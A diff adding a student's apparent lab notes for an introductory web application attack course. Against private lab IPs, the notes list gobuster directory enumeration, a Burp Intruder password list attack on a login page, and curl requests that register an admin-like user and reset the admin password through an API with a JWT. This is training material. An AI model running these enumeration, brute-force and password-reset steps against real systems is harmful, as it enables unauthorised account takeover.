@@ -1,0 +1,53 @@
+Introduction to Web application attack
+
+gobuster dir -u 192.168.60.16 -w /usr/share/wordlists/dirb/common.txt -t 5
+
+-------------------
+192.168.60.52
+
+gobuster dir -u 192.168.60.52 -w /usr/share/wordlists/dirb/common.txt -t 5
+
+-----------------
+http://192.168.60.52/passwords.txt
+
+burp suite intruder payload type:
+simple list, runtime file
+
+http://192.168.60.52/login.php
+
+-------------------------
+
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+
+curl -i http://192.168.50.16:5002/users/v1
+
+gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+
+curl -i http://192.168.50.16:5002/users/v1/login
+
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
+
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+
+------------------------
+192.168.60.16 offsecwp
+
+about us
+
+------------------------
+gobuster dir -u http://192.168.60.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+
+
+
+
+
+
